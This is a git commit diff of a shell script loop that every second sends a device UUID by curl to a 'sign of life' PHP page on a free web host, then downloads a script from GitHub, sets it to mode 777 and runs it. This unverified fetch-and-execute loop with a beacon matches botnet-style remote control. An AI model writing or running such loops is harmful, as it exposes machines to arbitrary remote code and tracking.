b69de3de88bf84896004d15202e77377459f07b8
U117A <33190250+U117A@users.noreply.github.com>
2020-11-24 14:27:37 -0300

    Update while.sh

--- while.sh
+++ while.sh
@@ -2,6 +2,9 @@
 
 while true
 do
-rm -rf update.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/update.sh && chmod 777 update.sh && ./update.sh
-sleep 60
+  uuid=(`cat ~/.device/uuid`)
+  curl https://adalbertomello.000webhostapp.com/sinaldevida.php?uuid=$uuid
+
+  rm -rf update.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/update.sh && chmod 777 update.sh && ./update.sh
+  sleep 1
 done
